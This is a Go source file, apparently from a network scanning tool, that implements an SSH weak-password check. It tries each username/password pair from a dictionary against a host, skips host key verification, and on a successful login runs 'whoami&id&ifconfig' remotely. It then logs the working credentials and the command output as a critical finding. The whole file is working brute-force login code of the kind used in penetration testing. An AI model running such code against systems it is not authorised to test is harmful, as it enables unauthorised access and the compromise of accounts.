package gopocs

import (
	"github.com/hanbufei/dddd/structs"
	_ "embed"
	"fmt"
	"github.com/projectdiscovery/gologger"
	"golang.org/x/crypto/ssh"
	"net"
	"strings"
	"time"
)

var sshUserPasswdDict string

func SshScan(info *structs.HostInfo) (tmperr error) {
	starttime := time.Now().Unix()

	userPasswdList := sortUserPassword(info, sshUserPasswdDict, []string{"ssh"})

	for _, userPass := range userPasswdList {
		flag, err := SshConn(info, userPass.UserName, userPass.Password)
		if flag == true && err == nil {
			return err
		} else {
			errStr := fmt.Sprintf("%v", err)
			if !strings.Contains(errStr, "unable to authenticate") {
				return err
			}
			tmperr = err
			if CheckErrs(err) {
				return err
			}
			if time.Now().Unix()-starttime > (int64(len(userPasswdList)) * 6) {
				return err
			}
		}
	}

	return tmperr
}

func SshConn(info *structs.HostInfo, user string, pass string) (flag bool, err error) {
	flag = false
	Host, Port, Username, Password := info.Host, info.Ports, user, pass
	Auth := []ssh.AuthMethod{ssh.Password(Password)}

	config := &ssh.ClientConfig{
		User:    Username,
		Auth:    Auth,
		Timeout: time.Duration(6) * time.Second,
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", Host, Port), config)
	if err == nil {
		defer client.Close()
		session, err := client.NewSession()
		if err == nil {
			defer session.Close()
			flag = true
			var result string
			result = fmt.Sprintf("SSH://%v:%v:%v %v", Host, Port, Username, Password)
			gologger.Silent().Msg("[GoPoc] " + result)

			shellInfo := "bash$ whoami&id&ifconfig\n"
			combo, sshErr := session.CombinedOutput("whoami&id&ifconfig")
			if sshErr == nil {
				shellInfo += string(combo)
			}

			showData := fmt.Sprintf("Host: %v:%v\nUsername: %v\nPassword: %v\n", Host, Port, Username, Password)

			GoPocWriteResult(structs.GoPocsResultType{
				PocName:     "SSH-Login",
				Security:    "CRITICAL",
				Target:      Host + ":" + Port,
				InfoLeft:    showData,
				InfoRight:   shellInfo,
				Description: "SSH弱口令",
			})

		}
	}
	return flag, err

}
